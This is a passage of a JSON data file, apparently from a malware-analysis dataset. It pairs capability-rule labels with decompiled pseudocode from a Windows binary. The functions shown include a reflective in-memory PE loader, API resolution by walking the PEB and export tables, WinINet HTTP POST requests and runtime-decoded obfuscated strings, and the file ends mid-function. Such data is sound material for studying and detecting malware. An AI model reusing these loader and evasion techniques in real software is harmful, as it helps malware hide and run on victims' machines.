{
    "1400010c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400010c4(int64_t *arg1)\n\n{\n    ulong uVar1;\n    int32_t iStack40;\n    \n    if (arg1 != NULL) {\n        if (*(arg1 + 0x1c) != 0) {\n            (*(*(*arg1 + 0x28) + arg1[1]))(arg1[1], 0, 0);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1, 0, arg1[10]);\n        if (arg1[2] != 0) {\n            for (iStack40 = 0; iStack40 < *(arg1 + 3); iStack40 = iStack40 + 1) {\n                if (*(arg1[2] + iStack40 * 8) != 0) {\n                    (*arg1[9])(*(arg1[2] + iStack40 * 8));\n                }\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1, 0, arg1[2]);\n        }\n        if (arg1[1] != 0) {\n            (*arg1[6])(arg1[1], 0, 0x8000, arg1[0xb]);\n        }\n        fcn.140003ec0(arg1[0xe], arg1[6], arg1[0xb]);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1, 0, arg1);\n    }\n    return;\n}\n",
        "token_count": 382
    },
    "1400013c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.1400013c0(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    ulong uVar2;\n    int64_t arg1_00;\n    \n    if (arg1 == 0) {\n        arg1_00 = 0;\n    }\n    else {\n        uVar1 = fcn.140002604(arg1);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        arg1_00 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        if (arg1_00 != 0) {\n            fcn.140002470(arg1_00, 0, uVar1 + 1);\n            fcn.140004830(arg1_00, arg1, uVar1);\n        }\n    }\n    return arg1_00;\n}\n",
        "token_count": 185
    },
    "140001d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140001d0c(int16_t *arg1, ulong arg2, code *arg3, code *arg4)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    int64_t **arg1_00;\n    int64_t *arg4_00;\n    int32_t *arg3_00;\n    int64_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    int64_t in_stack_00000038;\n    int64_t in_stack_00000040;\n    char in_stack_00000048;\n    int64_t *piStack192;\n    uint32_t uStack176;\n    int64_t iStack168;\n    int64_t **ppiStack160;\n    uint32_t uStack152;\n    int32_t iStack148;\n    uint64_t uStack120;\n    uint64_t uStack112;\n    uchar auStack64 [4];\n    uint32_t uStack60;\n    \n    uStack112 = 0;\n    ppiStack160 = NULL;\n    iVar1 = fcn.140004a08(arg2, 0x40);\n    if (iVar1 != 0) {\n        if (*arg1 == 0x5a4d) {\n            iVar1 = fcn.140004a08(arg2, *(arg1 + 0x1e) + 0x108);\n            if (iVar1 != 0) {\n                arg3_00 = arg1 + *(arg1 + 0x1e);\n                if (*arg3_00 == 0x4550) {\n                    if (*(arg3_00 + 1) == -0x799c) {\n                        if ((arg3_00[0xe] & 1U) == 0) {\n                            iStack168 = arg3_00 + *(arg3_00 + 5) + 0x18;\n                            for (uStack176 = 0; uStack176 < *(arg3_00 + 6); uStack176 = uStack176 + 1) {\n                                if (*(iStack168 + 0x10) == 0) {\n                                    uStack120 = *(iStack168 + 0xc) + arg3_00[0xe];\n                                }\n                                else {\n                                    uStack120 = *(iStack168 + 0xc) + *(iStack168 + 0x10);\n                                }\n                                if (uStack112 < uStack120) {\n                                    uStack112 = uStack120;\n                                }\n                                iStack168 = iStack168 + 0x28;\n                            }\n                            (*_sym.imp.KERNEL32.dll_GetNativeSystemInfo)(auStack64);\n                            iVar3 = fcn.1400014d4(arg3_00[0x14], uStack60);\n                            iVar4 = fcn.1400014d4(uStack112, uStack60);\n                            if (iVar3 == iVar4) {\n                                piStack192 = (*arg3)(*(arg3_00 + 0xc), iVar3, 0x3000, 4, in_stack_00000040);\n                                if ((piStack192 == NULL) &&\n                                   (piStack192 = (*arg3)(0, iVar3, 0x3000, 4, in_stack_00000040),  piStack192 == NULL))\n                                {\n                                    (*_sym.imp.KERNEL32.dll_SetLastError)(0xe);\n                                }\n                                else {\n                                    do {\n                                        if (piStack192 + iVar3 >> 0x20 <= piStack192 >> 0x20) {\n                                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapCreate)(0x40000, 0, 0);\n                                            arg4_00 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(iVar3, 8, 0x80);\n                                            arg4_00[0xf] = iVar3;\n                                            if (arg4_00 == NULL) {\n                                                (*arg4)(piStack192, 0, 0x8000, in_stack_00000040);\n                                                fcn.140003ec0(ppiStack160, arg4, in_stack_00000040);\n                                                (*_sym.imp.KERNEL32.dll_SetLastError)(0xe);\n                                                return NULL;\n                                            }\n                                            arg4_00[1] = piStack192;\n                                            uStack152 = (*(arg3_00 + 0x16) & 0x2000) != 0;\n                                            *(arg4_00 + 4) = uStack152;\n                                            arg4_00[5] = arg3;\n                                            arg4_00[6] = arg4;\n                                            arg4_00[7] = in_stack_00000028;\n                                            arg4_00[8] = in_stack_00000030;\n                                            arg4_00[9] = in_stack_00000038;\n                                            arg4_00[0xb] = in_stack_00000040;\n                                            *(arg4_00 + 0xd) = uStack60;\n                                            arg4_00[0xe] = ppiStack160;\n                                            iVar1 = fcn.140004a08(arg2, arg3_00[0x15]);\n                                            if (iVar1 != 0) {\n                                                iVar3 = (*arg3)(piStack192, arg3_00[0x15], 0x1000, 4, in_stack_00000040)\n                                                ;\n                                                fcn.140004830(iVar3, arg1, arg3_00[0x15]);\n                                                *arg4_00 = iVar3 + *(arg1 + 0x1e);\n                                                *(*arg4_00 + 0x30) = piStack192;\n                                                iVar1 = fcn.1400062e8(arg1, arg2, arg3_00, arg4_00);\n                                                if (iVar1 != 0) {\n                                                    iVar3 = *(*arg4_00 + 0x30) - *(arg3_00 + 0xc);\n                                                    if (iVar3 == 0) {\n                                                        *(arg4_00 + 0x24) = 1;\n                                                    }\n                                                    else {\n                                                        uVar2 = fcn.140004bc4(arg4_00, iVar3);\n                                                        *(arg4_00 + 0x24) = uVar2;\n                                                    }\n                                                    iVar1 = fcn.1400066a8(arg4_00);\n                                                    if (((iVar1 != 0) && (iVar1 = fcn.140002c04(arg4_00),  iVar1 != 0))\n                                                       && (iVar1 = fcn.140005294(arg4_00),  iVar1 != 0)) {\n                                                        if (*(*arg4_00 + 0x28) == 0) {\n                                                            arg4_00[0xc] = 0;\n                                                            return arg4_00;\n                                                        }\n                                                        if (*(arg4_00 + 4) == 0) {\n                                                            arg4_00[0xc] = piStack192 + *(*arg4_00 + 0x28);\n                                                            return arg4_00;\n                                                        }\n                                                        iStack148 = 1;\n                                                        if (in_stack_00000048 == '\\0') {\n                                                            iStack148 = (*(piStack192 + *(*arg4_00 + 0x28)))\n                                                                                  (piStack192, 1, 0);\n                                                        }\n                                                        if (iStack148 != 0) {\n                                                            *(arg4_00 + 0x1c) = 1;\n                                                            return arg4_00;\n                                                        }\n                                                        (*_sym.imp.KERNEL32.dll_SetLastError)(0x45a);\n                                                    }\n                                                }\n                                            }\n                                            fcn.1400010c4(arg4_00);\n                                            return NULL;\n                                        }\n                                        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                                        arg1_00 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5, 8, 0x10);\n                                        if (arg1_00 == NULL) {\n                                            (*arg4)(piStack192, 0, 0x8000, in_stack_00000040);\n                                            fcn.140003ec0(ppiStack160, arg4, in_stack_00000040);\n                                            (*_sym.imp.KERNEL32.dll_SetLastError)(0xe);\n                                            return NULL;\n                                        }\n                                        *arg1_00 = ppiStack160;\n                                        arg1_00[1] = piStack192;\n                                        piStack192 = (*arg3)(0, iVar3, 0x3000, 4, in_stack_00000040);\n                                        ppiStack160 = arg1_00;\n                                    } while (piStack192 != NULL);\n                                    fcn.140003ec0(arg1_00, arg4, in_stack_00000040);\n                                    (*_sym.imp.KERNEL32.dll_SetLastError)(0xe);\n                                }\n                            }\n                            else {\n                                (*_sym.imp.KERNEL32.dll_SetLastError)(0xc1);\n                            }\n                        }\n                        else {\n                            (*_sym.imp.KERNEL32.dll_SetLastError)(0xc1);\n                        }\n                    }\n                    else {\n                        (*_sym.imp.KERNEL32.dll_SetLastError)(0xc1);\n                    }\n                }\n                else {\n                    (*_sym.imp.KERNEL32.dll_SetLastError)(0xc1);\n                }\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0xc1);\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 2049
    },
    "14000247": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.140002470(int64_t arg1, ulong noname_1, ulong arg3)\n\n{\n    uint32_t uVar1;\n    uint32_t uStack40;\n    \n    uVar1 = SUB164(ZEXT416(arg3) / ZEXT816(4), 0);\n    for (uStack40 = arg3; uVar1 << 2 < uStack40; uStack40 = uStack40 - 1) {\n        *(arg1 + (uStack40 - 1)) = noname_1;\n    }\n    while (uStack40 = uVar1,  uStack40 != 0) {\n        *(arg1 + (uStack40 - 1) * 4) = noname_1 * 0x1000000 + noname_1 * 0x10000 + noname_1 * 0x100 + noname_1;\n        uVar1 = uStack40 - 1;\n    }\n    return arg1;\n}\n",
        "token_count": 217
    },
    "14000253": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.14000253c(ulong arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int64_t in_GS_OFFSET;\n    int64_t *piStack32;\n    int64_t iStack24;\n    \n    iVar1 = *(in_GS_OFFSET + 0x60);\n    if (iVar1 != 0) {\n        iStack24 = *(*(iVar1 + 0x18) + 0x20);\n        piStack32 = *(*(iVar1 + 0x18) + 0x20);\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(*(iStack24 + 0x50), arg1);\n            if (iVar2 == 0) {\n                return *(iStack24 + 0x20);\n            }\n            piStack32 = *piStack32;\n            iStack24 = *piStack32;\n        } while (piStack32 != *(*(iVar1 + 0x18) + 0x20));\n    }\n    return 0;\n}\n",
        "token_count": 232
    },
    "14000264": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t fcn.140002644(ulong arg1, int64_t arg2, int64_t *arg3)\n\n{\n    ulong uVar1;\n    char in_R9B;\n    ulong in_stack_00000028;\n    uint32_t in_stack_00000030;\n    ulong in_stack_ffffffffffffff88;\n    uint32_t uVar3;\n    uint64_t uVar2;\n    ulong in_stack_ffffffffffffff90;\n    uint uVar4;\n    uint32_t auStack88 [2];\n    int64_t iStack80;\n    ulong uStack72;\n    uint uStack64;\n    uint uStack60;\n    int32_t iStack56;\n    int32_t iStack52;\n    int64_t iStack48;\n    int64_t iStack40;\n    ulong uStack32;\n    char16_t *pcStack24;\n    ulong uStack16;\n    \n    uVar4 = in_stack_ffffffffffffff90 >> 0x20;\n    uVar3 = in_stack_ffffffffffffff88 >> 0x20;\n    uStack32 = fcn.1400012cc(0x14000a020);\n    iStack40 = (**0x14000a9c8)(uStack32, 0, 0, 0, uVar3 << 0x20);\n    if (iStack40 != 0) {\n        uStack64 = 0x50;\n        uVar1 = fcn.1400012cc(0x14000a0a8);\n        iStack48 = (**0x14000aa48)(iStack40, uVar1, uStack64, 0, 0, CONCAT44(uVar4, 3), 0, 1);\n        if (iStack48 != 0) {\n            uStack72 = 0x14000822c;\n            pcStack24 = L\"text/html,*/*;q=0.9\";\n            uStack16 = 0;\n            if (in_R9B == '\\0') {\n                uStack72 = fcn.1400012cc(0x14000a080);\n            }\n            else {\n                pcStack24 = L\"text/html\";\n                uStack72 = fcn.1400012cc(0x14000a178);\n            }\n            uStack60 = 0;\n            uVar2 = 0;\n            iStack80 = (**0x14000aa80)(iStack48, uStack72, arg1, 0, 0, &pcStack24, 0, 1);\n            if (in_R9B != '\\0') {\n                (**0x14000aa38)(iStack80, L\"Content-Type: application/x-www-form-urlencoded\\r\\n\", 0xffffffff, 0xa0000000\n                               );\n            }\n            if (iStack80 != 0) {\n                iStack56 = (**0x14000aa10)(iStack80, 0, 0, in_stack_00000028, \n                                           uVar2 & 0xffffffff00000000 | in_stack_00000030);\n                if (iStack56 != 0) {\n                    while ((iStack52 = (**0x14000aa40)(iStack80, arg2 + *arg3, 0xfffe, auStack88),  iStack52 != 0 &&\n                           (auStack88[0] != 0))) {\n                        *arg3 = auStack88[0] + *arg3;\n                        *(arg2 + *arg3) = 0;\n                    }\n                }\n                (**0x14000aa70)(iStack80);\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1, 0, uStack72);\n            (**0x14000aa70)(iStack48);\n        }\n        (**0x14000aa70)(iStack40);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1, 0, uStack32);\n    return *arg3;\n}\n",
        "token_count": 904
    },
    "140002e3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.140002e3c(int64_t arg1, uint64_t arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    ulong uVar6;\n    code *pcVar7;\n    int64_t arg1_00;\n    int64_t iVar8;\n    uint64_t uVar9;\n    uint32_t uStack148;\n    uint64_t uStack128;\n    \n    iVar8 = arg1 + *(arg1 + 0x3c);\n    uVar9 = arg1 + *(iVar8 + 0x88);\n    uVar1 = *(uVar9 + 0x24);\n    uVar2 = *(uVar9 + 0x20);\n    uStack128 = 0;\n    if (arg2 >> 0x10 == 0) {\n        uVar3 = arg2;\n        uVar1 = *(uVar9 + 0x10);\n        if ((uVar3 < uVar1) || (uVar1 + *(uVar9 + 0x14) <= uVar3)) {\n            return 0;\n        }\n        uStack128 = arg1 + *(arg1 + *(uVar9 + 0x1c) + (uVar3 - uVar1) * 8);\n    }\n    else {\n        for (uStack148 = 0; uStack148 < *(uVar9 + 0x18); uStack148 = uStack148 + 1) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(arg2, arg1 + *(arg1 + uVar2 + uStack148 * 4));\n            if (iVar4 == 0) {\n                uStack128 = arg1 + *(arg1 + *(uVar9 + 0x1c) + *(arg1 + uVar1 + uStack148 * 2) * 4);\n                break;\n            }\n        }\n    }\n    if ((uVar9 <= uStack128) && (uStack128 < uVar9 + *(iVar8 + 0x8c))) {\n        iVar8 = fcn.1400013c0(uStack128);\n        if (iVar8 == 0) {\n            uStack128 = 0;\n        }\n        else {\n            puVar5 = fcn.140001000(iVar8, 0x2e);\n            *puVar5 = 0;\n            uVar6 = fcn.14000253c(L\"KERNEL32.DLL\");\n            pcVar7 = fcn.140002e3c(uVar6, 0x140008500);\n            if (pcVar7 == NULL) {\n                uStack128 = 0;\n            }\n            else {\n                arg1_00 = (*pcVar7)(iVar8);\n                uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6, 0, iVar8);\n                if (arg1_00 == 0) {\n                    uStack128 = 0;\n                }\n                else {\n                    uStack128 = fcn.140002e3c(arg1_00, puVar5 + 1);\n                }\n            }\n        }\n    }\n    return uStack128;\n}\n",
        "token_count": 730
    },
    "1400031b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.1400031b0(uchar *arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    uchar *puVar5;\n    uchar *puVar6;\n    int32_t iStack168;\n    uint64_t uStack160;\n    uint uStack152;\n    uint uStack148;\n    int64_t iStack144;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uchar auStack120 [16];\n    uchar auStack104 [88];\n    \n    if ((*(arg1 + 0x38) == 0) || (*(arg1 + 0x40) == 0)) {\n        uVar2 = 0;\n    }\n    else {\n        if (*(arg1 + 0x40) % 0x7f17 == 0) {\n            iStack168 = SUB164(ZEXT816(*(arg1 + 0x40)) / ZEXT816(0x7f17), 0);\n        }\n        else {\n            iStack168 = SUB164(ZEXT816(*(arg1 + 0x40)) / ZEXT816(0x7f17), 0) + 1;\n        }\n        for (uStack160 = 0; uStack160 < iStack168; uStack160 = uStack160 + 1) {\n            puVar5 = arg1;\n            puVar6 = auStack104;\n            for (iVar4 = 0x48; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar6 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            piVar3 = fcn.140005d40(auStack120, auStack104, uStack160 & 0xffffffff);\n            uStack152 = *piVar3;\n            uStack148 = *(piVar3 + 4);\n            uStack128 = *(piVar3 + 1);\n            uStack124 = *(piVar3 + 0xc);\n            iStack144 = piVar3[1];\n            if ((*piVar3 == 0) || (iStack144 == 0)) break;\n            uStack136 = uStack152;\n            uStack132 = uStack148;\n            iVar1 = fcn.140005180(*piVar3, 10);\n            if ((iVar1 < 0) || (0x7f17 < iVar1)) {\n                iStack144 = 0;\n            }\n            fcn.14000428c(&uStack152, 0xffff);\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 606
    },
    "14000330": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.140003308(ulong arg1, ulong arg2)\n\n{\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    if (arg2 == 0) {\n        iStack20 = 1;\n    }\n    else if (arg2 < 0) {\n        iStack20 = -1;\n    }\n    else {\n        iStack20 = arg1;\n        for (iStack24 = 1; iStack24 < arg2; iStack24 = iStack24 + 1) {\n            iStack20 = iStack20 * arg1;\n        }\n    }\n    return iStack20;\n}\n",
        "token_count": 141
    },
    "14000338": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140003388(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    int64_t iStackX8;\n    int64_t iStack64;\n    char cStack48;\n    \n    iStack64 = 0;\n    iStackX8 = arg1;\n    iVar1 = iStack64;\n    do {\n        iStack64 = iVar1;\n        iVar1 = iStackX8 % arg3;\n        if (iVar1 < 10) {\n            cStack48 = iVar1 + '0';\n        }\n        else {\n            cStack48 = *(iVar1 + 0x140008176);\n        }\n        *(arg2 + iStack64) = cStack48;\n        iVar1 = iStack64 + 1;\n        iStackX8 = iStackX8 / arg3;\n    } while (0 < iStackX8);\n    if (arg1 < 1) {\n        *(arg2 + iVar1) = 0x2d;\n        iVar1 = iStack64 + 2;\n    }\n    iStack64 = iVar1;\n    *(arg2 + iStack64) = 0;\n    fcn.1400042d0(arg2);\n    return;\n}\n",
        "token_count": 273
    },
    "1400034d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.1400034d4(void)\n\n{\n    ulong arg1;\n    uchar uStack296;\n    uchar uStack295;\n    uchar uStack294;\n    uchar uStack293;\n    uchar uStack292;\n    uchar uStack291;\n    uchar uStack290;\n    uchar uStack289;\n    uchar uStack288;\n    uchar uStack287;\n    uchar uStack286;\n    uchar uStack285;\n    uchar uStack284;\n    uchar uStack283;\n    uchar uStack282;\n    uchar uStack281;\n    uchar uStack280;\n    uchar uStack279;\n    uchar uStack278;\n    uchar uStack277;\n    uchar uStack276;\n    uchar uStack275;\n    uchar uStack274;\n    uchar uStack273;\n    uchar uStack272;\n    uchar uStack271;\n    uchar uStack270;\n    uchar uStack269;\n    uchar uStack268;\n    uchar uStack267;\n    uchar uStack266;\n    uchar uStack265;\n    uchar uStack264;\n    uchar uStack263;\n    uchar uStack262;\n    uchar uStack261;\n    uchar uStack260;\n    uchar uStack259;\n    uchar uStack258;\n    uchar uStack257;\n    uchar uStack256;\n    uchar uStack255;\n    uchar uStack254;\n    uchar uStack253;\n    uchar uStack252;\n    uchar uStack248;\n    uchar uStack247;\n    uchar uStack246;\n    uchar uStack245;\n    uchar uStack244;\n    uchar uStack243;\n    uchar uStack242;\n    uchar uStack241;\n    uchar uStack240;\n    uchar uStack239;\n    uchar uStack238;\n    uchar uStack237;\n    uchar uStack236;\n    uchar uStack235;\n    uchar uStack234;\n    uchar uStack233;\n    uchar uStack232;\n    uchar uStack231;\n    uchar uStack230;\n    uchar uStack229;\n    uchar uStack228;\n    uchar uStack227;\n    uchar uStack226;\n    uchar uStack225;\n    uchar uStack224;\n    uchar uStack223;\n    uchar uStack222;\n    uchar uStack221;\n    uchar uStack220;\n    uchar uStack219;\n    uchar uStack218;\n    uchar uStack216;\n    uchar uStack215;\n    uchar uStack214;\n    uchar uStack213;\n    uchar uStack212;\n    uchar uStack211;\n    uchar uStack210;\n    uchar uStack209;\n    uchar uStack208;\n    uchar uStack207;\n    uchar uStack206;\n    uchar uStack205;\n    uchar uStack204;\n    uchar uStack203;\n    uchar uStack202;\n    uchar uStack201;\n    uchar uStack200;\n    uchar uStack199;\n    uchar uStack198;\n    uchar uStack197;\n    uchar uStack196;\n    uchar uStack195;\n    uchar uStack194;\n    uchar uStack193;\n    uchar uStack192;\n    uchar uStack191;\n    uchar uStack190;\n    uchar uStack189;\n    uchar uStack188;\n    uchar uStack187;\n    uchar uStack186;\n    uchar uStack185;\n    uchar uStack184;\n    uchar uStack183;\n    uchar uStack182;\n    uchar uStack181;\n    uchar uStack180;\n    uchar uStack179;\n    uchar uStack178;\n    uchar uStack177;\n    uchar uStack176;\n    uchar uStack175;\n    uchar uStack174;\n    uchar uStack173;\n    uchar uStack172;\n    uchar uStack171;\n    uchar uStack170;\n    uchar uStack169;\n    uchar uStack168;\n    uchar uStack167;\n    uchar uStack166;\n    uchar uStack165;\n    uchar uStack164;\n    uchar uStack163;\n    uchar uStack162;\n    uchar uStack161;\n    uchar uStack160;\n    uchar uStack159;\n    uchar uStack158;\n    uchar uStack157;\n    uchar uStack156;\n    uchar uStack155;\n    uchar uStack154;\n    uchar uStack153;\n    uchar uStack152;\n    uchar uStack151;\n    uchar uStack144;\n    uchar uStack143;\n    uchar uStack142;\n    uchar uStack141;\n    uchar uStack140;\n    uchar uStack139;\n    uchar uStack138;\n    uchar uStack137;\n    uchar uStack136;\n    uchar uStack135;\n    uchar uStack134;\n    uchar uStack133;\n    uchar uStack132;\n    uchar uStack131;\n    uchar uStack130;\n    uchar uStack129;\n    uchar uStack128;\n    uchar uStack127;\n    uchar uStack126;\n    uchar uStack125;\n    uchar uStack124;\n    uchar uStack123;\n    uchar uStack122;\n    uchar uStack121;\n    uchar uStack120;\n    uchar uStack119;\n    uchar uStack118;\n    uchar uStack117;\n    uchar uStack116;\n    uchar uStack115;\n    uchar uStack114;\n    uchar uStack113;\n    uchar uStack112;\n    uchar uStack111;\n    uchar uStack110;\n    uchar uStack109;\n    uchar uStack108;\n    uchar uStack107;\n    uchar uStack104;\n    uchar uStack103;\n    uchar uStack102;\n    uchar uStack101;\n    uchar uStack100;\n    uchar uStack99;\n    uchar uStack98;\n    uchar uStack97;\n    uchar uStack96;\n    uchar uStack95;\n    uchar uStack94;\n    uchar uStack93;\n    uchar uStack92;\n    uchar uStack91;\n    uchar uStack90;\n    uchar uStack89;\n    uchar uStack88;\n    uchar uStack87;\n    uchar uStack86;\n    uchar uStack85;\n    uchar uStack84;\n    uchar uStack83;\n    uchar uStack82;\n    uchar uStack81;\n    uchar uStack80;\n    uchar uStack79;\n    uchar uStack78;\n    uchar uStack77;\n    uchar uStack76;\n    uchar uStack75;\n    uchar uStack74;\n    uchar uStack73;\n    uchar uStack72;\n    uchar uStack71;\n    uchar uStack70;\n    uchar uStack69;\n    uchar uStack68;\n    uchar uStack67;\n    uchar uStack66;\n    uchar uStack65;\n    uchar uStack64;\n    uchar uStack63;\n    uchar uStack62;\n    uchar uStack61;\n    ulong uStack56;\n    ulong uStack48;\n    uint32_t *puStack40;\n    ulong uStack32;\n    ulong uStack24;\n    \n    uStack104 = 0xfb;\n    uStack103 = 0xfc;\n    uStack102 = 0xfe;\n    uStack101 = 0xff;\n    uStack100 = 0xaa;\n    uStack99 = 0x44;\n    uStack98 = 0x3c;\n    uStack97 = 0x5f;\n    uStack96 = 0x5b;\n    uStack95 = 0x6e;\n    uStack94 = 0x74;\n    uStack93 = 0x6b;\n    uStack92 = 0x77;\n    uStack91 = 0x80;\n    uStack90 = 0x7d;\n    uStack89 = 0x67;\n    uStack88 = 0x5f;\n    uStack87 = 0x86;\n    uStack86 = 0x81;\n    uStack85 = 0x83;\n    uStack84 = 0x75;\n    uStack83 = 0x7e;\n    uStack82 = 0x45;\n    uStack81 = 0x45;\n    uStack80 = 0x70;\n    uStack79 = 0x83;\n    uStack78 = 0x8a;\n    uStack77 = 0x7b;\n    uStack76 = 0x84;\n    uStack75 = 0x85;\n    uStack74 = 0x48;\n    uStack73 = 0x7f;\n    uStack72 = 0x88;\n    uStack71 = 0x89;\n    uStack70 = 0;\n    uStack69 = 7;\n    uStack68 = 0x6d;\n    uStack67 = 0x4f;\n    uStack66 = 0x72;\n    uStack65 = 0x78;\n    uStack64 = 0x78;\n    uStack63 = 0x78;\n    uStack62 = 0x78;\n    uStack61 = 0;\n    arg1 = fcn.140006a6c(&uStack104);\n    uStack48 = fcn.1400012cc(arg1);\n    puStack40 = fcn.140002958(uStack48);\n    uStack56 = fcn.140001260(*(puStack40 + 2), *puStack40);\n    uStack144 = 0xfb;\n    uStack143 = 0xfc;\n    uStack142 = 0xfe;\n    uStack141 = 0xff;\n    uStack140 = 0xaa;\n    uStack139 = 0x4f;\n    uStack138 = 0x76;\n    uStack137 = 0x44;\n    uStack136 = 0x70;\n    uStack135 = 0x71;\n    uStack134 = 0x75;\n    uStack133 = 0x6a;\n    uStack132 = 0x69;\n    uStack131 = 0x7d;\n    uStack130 = 0x6f;\n    uStack129 = 0x61;\n    uStack128 = 0x75;\n    uStack127 = 0x7f;\n    uStack126 = 0x82;\n    uStack125 = 0x84;\n    uStack124 = 0x71;\n    uStack123 = 0x7d;\n    uStack122 = 0x5f;\n    uStack121 = 0x78;\n    uStack120 = 0x81;\n    uStack119 = 0x84;\n    uStack118 = 0x88;\n    uStack117 = 0x90;\n    uStack116 = 0;\n    uStack115 = 7;\n    uStack114 = 0x6d;\n    uStack113 = 0x4f;\n    uStack112 = 0x72;\n    uStack111 = 0x78;\n    uStack110 = 0x78;\n    uStack109 = 0x78;\n    uStack108 = 0x78;\n    uStack107 = 0;\n    fcn.140006a6c(&uStack144);\n    uStack184 = 0xfb;\n    uStack183 = 0xfc;\n    uStack182 = 0xfe;\n    uStack181 = 0xff;\n    uStack180 = 0xaa;\n    uStack179 = 0x4f;\n    uStack178 = 0x76;\n    uStack177 = 0x49;\n    uStack176 = 0x76;\n    uStack175 = 0x6a;\n    uStack174 = 0x6b;\n    uStack173 = 